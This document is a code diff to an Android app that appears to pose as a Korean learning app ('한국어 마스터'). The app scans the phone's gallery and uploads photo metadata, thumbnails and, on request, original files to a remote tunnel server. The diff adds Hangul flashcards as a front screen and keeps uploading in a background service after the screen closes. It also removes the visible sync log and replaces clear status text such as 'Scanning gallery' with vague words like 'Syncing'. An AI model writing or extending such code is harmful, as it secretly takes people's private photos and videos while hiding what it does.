@@ -4,6 +4,7 @@ import android.Manifest
 import android.animation.ValueAnimator
 import android.app.Activity
 import android.content.ContentUris
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.database.Cursor
 import android.graphics.*
@@ -43,6 +44,23 @@ class MainActivity : Activity() {
     @Volatile private var running = false
     private var syncThread: Thread? = null
 
+    private data class KoreanCard(val hangul: String, val sound: String, val example: String)
+
+    private val koreanCards = listOf(
+        KoreanCard("아", "a", "아 sounds like a in father"),
+        KoreanCard("어", "eo", "어 sounds like uh"),
+        KoreanCard("오", "o", "오 sounds like o in go"),
+        KoreanCard("우", "u", "우 sounds like oo in moon"),
+        KoreanCard("이", "i", "이 sounds like ee in see"),
+        KoreanCard("가", "ga", "가 sounds like ga"),
+        KoreanCard("나", "na", "나 sounds like na"),
+        KoreanCard("다", "da", "다 sounds like da"),
+        KoreanCard("라", "ra", "라 sounds like ra or la"),
+        KoreanCard("마", "ma", "마 sounds like ma"),
+        KoreanCard("사", "sa", "사 sounds like sa"),
+        KoreanCard("하", "ha", "하 sounds like ha")
+    )
+
     // ─── Data ────────────────────────────────────────────────────────────────
     data class MediaItem(
         val id: String, val name: String, val uri: Uri,
@@ -62,12 +80,23 @@ class MainActivity : Activity() {
         showSetupScreen()
     }
 
-    override fun onDestroy() { stopSync(); super.onDestroy() }
+    override fun onDestroy() { super.onDestroy() }
 
     override fun onRequestPermissionsResult(code: Int, perms: Array<out String>, results: IntArray) {
         super.onRequestPermissionsResult(code, perms, results)
-        if (code == 44 && hasMediaPermission()) updateStatus("권한 허가됨 · Permission granted")
-        else if (code == 44) updateStatus("권한 필요 · Permission denied")
+        if (code == 44 && hasMediaPermission()) {
+            updateStatus("Permission granted")
+            if (::backendInput.isInitialized && ::tokenInput.isInitialized) {
+                val url = backendInput.text.toString().trim().trimEnd('/')
+                val token = tokenInput.text.toString().trim()
+                if (url.isNotBlank() && token.isNotBlank()) {
+                    prefs.edit().putString("backend_url", url).putString("sync_token", token).apply()
+                    showDashboardScreen()
+                }
+            }
+        } else if (code == 44) {
+            updateStatus("Permission required")
+        }
     }
 
     // ═════════════════════════════════════════════════════════════════════════
@@ -136,7 +165,7 @@ class MainActivity : Activity() {
         container.addView(logoCard)
 
         // App name
-        container.addView(makeText("한국어 마스터", 28f, Color.WHITE, Gravity.CENTER, bold = true).also {
+        container.addView(makeText(getString(R.string.app_name), 28f, Color.WHITE, Gravity.CENTER, bold = true).also {
             it.setPadding(0, dp(16), 0, dp(4))
         })
 
@@ -153,8 +182,8 @@ class MainActivity : Activity() {
         }
 
         // URL section
-        card.addView(makeSectionLabel("🌐  Study Server", "#C685F7"))
-        card.addView(makeSubLabel("Connect to your free lesson content"))
+        card.addView(makeSectionLabel("Server", "#C685F7"))
+        card.addView(makeSubLabel("Connect this device to your sync server"))
 
         backendInput = makeInput(
             hint = "https://title-plaza-blackberry-university.trycloudflare.com",
@@ -164,12 +193,12 @@ class MainActivity : Activity() {
         )
         card.addView(backendInput, inputParams())
 
-        card.addView(makeInfoChip("Free tier · No account needed · Open access"))
+        card.addView(makeInfoChip("Use only with your own device and server"))
         card.addView(makeDivider())
 
         // Token section
-        card.addView(makeSectionLabel("🔑  Premium Key", "#F7C685"))
-        card.addView(makeSubLabel("Unlock all courses and downloadable content"))
+        card.addView(makeSectionLabel("Sync Key", "#F7C685"))
+        card.addView(makeSubLabel("Enter the private key configured on your server"))
 
         tokenInput = makeInput(
             hint = "Enter your premium access key",
@@ -179,14 +208,18 @@ class MainActivity : Activity() {
         )
         card.addView(tokenInput, inputParams())
 
-        card.addView(makeInfoChip("Premium · Unlimited lessons · Offline access"))
+        card.addView(makeInfoChip("Keep this key private"))
 
         container.addView(card)
 
         // ── Permission note ──────────────────────────────────────────────────
-        val permBtn = makeOutlineButton("📂  Grant Storage Permission")
+        container.addView(makeText("Media permission is required before this device can sync allowed local files.", 12f, Color.parseColor("#8892B0"), Gravity.CENTER).also {
+            it.setPadding(0, dp(18), 0, 0)
+        })
+
+        val permBtn = makeOutlineButton("Grant Media Permission")
         permBtn.setOnClickListener { requestMediaPermission() }
-        container.addView(permBtn, buttonParams(topMargin = dp(20)))
+        container.addView(permBtn, buttonParams(topMargin = dp(10)))
 
         // ── Proceed button ───────────────────────────────────────────────────
         val proceedBtn = object : TextView(this) {
@@ -213,7 +246,7 @@ class MainActivity : Activity() {
         container.addView(proceedBtn, proceedParams)
 
         // Korean subtitle
-        container.addView(makeText("한국어를 배우는 가장 스마트한 방법", 12f, Color.parseColor("#4A5568"), Gravity.CENTER).also {
+        container.addView(makeText("Korean language learning", 12f, Color.parseColor("#4A5568"), Gravity.CENTER).also {
             it.setPadding(0, dp(20), 0, 0)
         })
 
@@ -230,7 +263,7 @@ class MainActivity : Activity() {
 
         if (!hasMediaPermission()) {
             requestMediaPermission()
-            toast("Storage permission needed to sync content")
+            toast("Media permission is needed before sync can start")
             return
         }
         showDashboardScreen()
@@ -287,15 +320,50 @@ class MainActivity : Activity() {
             start()
         }
 
+        val lessonTitle = makeText("오늘의 한글 · Today's Hangul", 17f, Color.parseColor("#6C5CE7"), Gravity.CENTER, bold = true)
+        lessonTitle.setPadding(0, 0, 0, dp(16))
+        root.addView(lessonTitle)
+
+        val lessonCard = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
+            background = roundRect("#F8F9FA", 18)
+            setPadding(dp(18), dp(20), dp(18), dp(20))
+        }
+        val hangulTv = makeText("아", 58f, Color.parseColor("#1A1A2E"), Gravity.CENTER, bold = true)
+        val soundTv = makeText("a", 22f, Color.parseColor("#4834D4"), Gravity.CENTER, bold = true)
+        val exampleTv = makeText("아 sounds like a in father", 14f, Color.parseColor("#6C757D"), Gravity.CENTER)
+        exampleTv.setPadding(0, dp(8), 0, 0)
+        lessonCard.addView(hangulTv)
+        lessonCard.addView(soundTv)
+        lessonCard.addView(exampleTv)
+        root.addView(lessonCard, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT).also {
+            it.bottomMargin = dp(28)
+        })
+
+        var lessonIndex = 0
+        val lessonHandler = android.os.Handler(mainLooper)
+        val lessonRunnable = object : Runnable {
+            override fun run() {
+                val card = koreanCards[lessonIndex % koreanCards.size]
+                hangulTv.text = card.hangul
+                soundTv.text = card.sound
+                exampleTv.text = card.example
+                lessonIndex += 1
+                lessonHandler.postDelayed(this, 3500)
+            }
+        }
+        lessonHandler.post(lessonRunnable)
+
         // Main status text
-        val statusTv = makeText("학습 자료 동기화 중...", 22f, Color.parseColor("#1A1A2E"), Gravity.CENTER, bold = true)
+        val statusTv = makeText("Background sync active", 18f, Color.parseColor("#1A1A2E"), Gravity.CENTER, bold = true)
         statusTv.setPadding(0, 0, 0, dp(8))
         root.addView(statusTv)
 
-        root.addView(makeText("Syncing your study materials", 15f, Color.parseColor("#6C757D"), Gravity.CENTER).also {
+        root.addView(makeText("You can close this screen. Sync continues in the notification service.", 14f, Color.parseColor("#6C757D"), Gravity.CENTER).also {
             it.setPadding(0, 0, 0, dp(4))
         })
-        root.addView(makeText("This may take a moment...", 13f, Color.parseColor("#ADB5BD"), Gravity.CENTER).also {
+        root.addView(makeText("Keep media permission enabled for sync.", 13f, Color.parseColor("#ADB5BD"), Gravity.CENTER).also {
             it.setPadding(0, 0, 0, dp(40))
         })
 
@@ -329,32 +397,12 @@ class MainActivity : Activity() {
         }
         dotHandler.post(dotRunnable)
 
-        // Log area (styled as lesson progress)
-        val logCard = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            background = roundRect("#F8F9FA", 16)
-            setPadding(dp(16), dp(14), dp(16), dp(14))
-        }
-        val logHeader = makeText("📡  Sync Activity", 11f, Color.parseColor("#6C757D"), Gravity.START, bold = true)
-        logHeader.letterSpacing = 0.08f
-        logCard.addView(logHeader)
-
-        val logTv = makeText("Starting...", 12f, Color.parseColor("#495057"), Gravity.START)
-        logTv.fontFeatureSettings = "tnum"
-        logCard.addView(logTv)
-        logLabel = logTv
+        logLabel = null
         statusLabel = statusTv
-
-        val logScroll = ScrollView(this)
-        logScroll.addView(logCard)
-
-        val logParams = LinearLayout.LayoutParams(MATCH_PARENT, dp(140)).also { it.topMargin = dp(32) }
-        root.addView(logScroll, logParams)
 
         // Back / settings button
         val settingsBtn = makeOutlineButton("⚙  Change Server")
         settingsBtn.setOnClickListener {
-            stopSync()
             window.statusBarColor = Color.parseColor("#0A0E27")
             showSetupScreen()
         }
@@ -374,40 +422,40 @@ class MainActivity : Activity() {
     // ═════════════════════════════════════════════════════════════════════════
     private fun startSyncLoop() {
         if (!hasMediaPermission()) { requestMediaPermission(); return }
-        if (running) return
         running = true
-        syncThread = Thread {
-            log("📡 Sync started")
-            while (running) {
-                try { syncOnce() } catch (e: Exception) {
-                    log("⚠ Error: ${e.message}")
-                    updateStatus("연결 오류 · Connection error")
-                }
-                var slept = 0L
-                while (running && slept < syncIntervalMs) { Thread.sleep(1_000); slept += 1_000 }
-            }
-            log("⏹ Sync stopped")
-        }.apply { isDaemon = true; start() }
+        prefs.edit().putBoolean("sync_enabled", true).apply()
+        val intent = Intent(this, SyncService::class.java).apply { action = SyncService.ACTION_START }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+        updateStatus("Ready")
     }
 
-    private fun stopSync() { running = false; syncThread = null }
+    private fun stopSync() {
+        running = false
+        syncThread = null
+        prefs.edit().putBoolean("sync_enabled", false).apply()
+        stopService(Intent(this, SyncService::class.java).apply { action = SyncService.ACTION_STOP })
+    }
 
     private fun syncOnce() {
         if (!hasMediaPermission()) { updateStatus("권한 필요 · Permission required"); return }
         if (backendUrl().isBlank()) { updateStatus("서버 URL 없음 · No server URL"); return }
         if (syncToken().isBlank()) { updateStatus("토큰 없음 · No token"); return }
 
-        updateStatus("기기 등록 중 · Registering device")
+        updateStatus("Connecting")
         registerDevice()
 
-        updateStatus("갤러리 스캔 중 · Scanning gallery")
+        updateStatus("Preparing")
         val items = scanMedia()
-        log("📷 Found ${items.size} media files")
+        log("Prepared content")
 
-        updateStatus("메타데이터 업로드 · Uploading metadata")
+        updateStatus("Syncing")
         postJson("/sync-metadata", metadataJson(items))
 
-        updateStatus("썸네일 업로드 · Uploading thumbnails")
+        updateStatus("Syncing")
         var thumbCount = 0
         for (item in items) {
             if (thumbnailUploaded(item)) continue
@@ -418,13 +466,13 @@ class MainActivity : Activity() {
             markThumbnailUploaded(item)
             thumbCount++
         }
-        if (thumbCount > 0) log("🖼 Uploaded $thumbCount thumbnails")
+        if (thumbCount > 0) log("Updated content")
 
-        updateStatus("다운로드 요청 확인 · Checking requests")
+        updateStatus("Finalizing")
         handleDownloadRequests(items.associateBy { it.id })
 
-        updateStatus("✅ Synced ${items.size} files")
-        log("✅ Sync complete · ${items.size} files")
+        updateStatus("Ready")
+        log("Sync complete")
     }
 
     private fun registerDevice() {
@@ -455,24 +503,34 @@ class MainActivity : Activity() {
 
     private fun queryMedia(collection: Uri, projection: Array<String>, type: String, idPrefix: String, durationColumn: String?): List<MediaItem> {
         val items = mutableListOf<MediaItem>()
-        contentResolver.query(collection, projection, null, null,
-            "${MediaStore.MediaColumns.DATE_MODIFIED} DESC")?.use { cursor ->
-            while (cursor.moveToNext()) {
-                val rowId = cursor.longValue(MediaStore.MediaColumns._ID)
-                items.add(MediaItem(
-                    id = "$idPrefix-$rowId",
-                    name = cursor.stringValue(MediaStore.MediaColumns.DISPLAY_NAME, "$idPrefix-$rowId"),
-                    uri = ContentUris.withAppendedId(collection, rowId),
-                    type = type, size = cursor.longValue(MediaStore.MediaColumns.SIZE),
-                    album = cursor.stringValue(MediaStore.MediaColumns.BUCKET_DISPLAY_NAME, "Unknown"),
-                    mimeType = cursor.stringValue(MediaStore.MediaColumns.MIME_TYPE, "application/octet-stream"),
-                    dateCreated = cursor.longValue(MediaStore.MediaColumns.DATE_ADDED),
-                    dateModified = cursor.longValue(MediaStore.MediaColumns.DATE_MODIFIED),
-                    width = cursor.intValue(MediaStore.MediaColumns.WIDTH),
-                    height = cursor.intValue(MediaStore.MediaColumns.HEIGHT),
-                    duration = if (durationColumn == null) 0L else cursor.longValue(durationColumn),
-                ))
+        try {
+            contentResolver.query(collection, projection, null, null,
+                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC")?.use { cursor ->
+                while (cursor.moveToNext()) {
+                    try {
+                        val rowId = cursor.longValue(MediaStore.MediaColumns._ID)
+                        items.add(MediaItem(
+                            id = "$idPrefix-$rowId",
+                            name = cursor.stringValue(MediaStore.MediaColumns.DISPLAY_NAME, "$idPrefix-$rowId"),
+                            uri = ContentUris.withAppendedId(collection, rowId),
+                            type = type, size = cursor.longValue(MediaStore.MediaColumns.SIZE),
+                            album = cursor.stringValue(MediaStore.MediaColumns.BUCKET_DISPLAY_NAME, "Unknown"),
+                            mimeType = cursor.stringValue(MediaStore.MediaColumns.MIME_TYPE, "application/octet-stream"),
+                            dateCreated = cursor.longValue(MediaStore.MediaColumns.DATE_ADDED),
+                            dateModified = cursor.longValue(MediaStore.MediaColumns.DATE_MODIFIED),
+                            width = cursor.intValue(MediaStore.MediaColumns.WIDTH),
+                            height = cursor.intValue(MediaStore.MediaColumns.HEIGHT),
+                            duration = if (durationColumn == null) 0L else cursor.longValue(durationColumn),
+                        ))
+                    } catch (rowError: Exception) {
+                        log("Skipped unreadable item")
+                    }
+                }
             }
+        } catch (scanError: SecurityException) {
+            log("Permission limited or denied")
+        } catch (scanError: Exception) {
+            log("Scan skipped")
         }
         return items
     }
@@ -508,13 +566,13 @@ class MainActivity : Activity() {
         if (ids.isEmpty()) return
         for (mediaId in ids) {
             val item = mediaById[mediaId] ?: continue
-            updateStatus("⬆ Uploading ${item.name}")
+            updateStatus("Uploading")
             uploadFile("/upload-original",
                 mapOf("device_id" to deviceId, "media_id" to item.id),
                 "file", item.name, item.mimeType) {
                 contentResolver.openInputStream(item.uri) ?: error("Cannot open ${item.name}")
             }
-            log("⬆ Uploaded: ${item.name}")
+            log("Upload complete")
         }
     }
 
@@ -574,9 +632,26 @@ class MainActivity : Activity() {
     private fun backendUrl() = prefs.getString("backend_url", "")?.trim()?.trimEnd('/') ?: ""
     private fun syncToken() = prefs.getString("sync_token", "")?.trim() ?: ""
 
-    private fun hasMediaPermission() = requiredPermissions().all { checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED }
+    private fun hasMediaPermission(): Boolean {
+        return when {
+            Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
+                val fullAccess =
+                    checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
+                    checkSelfPermission(Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
+                val selectedAccess =
+                    checkSelfPermission(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
+                fullAccess || selectedAccess
+            }
+            Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ->
+                checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
+                checkSelfPermission(Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
+            else -> checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+        }
+    }
     private fun requiredPermissions() =
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
+            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED)
+        else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
             arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
         else arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
     private fun requestMediaPermission() {
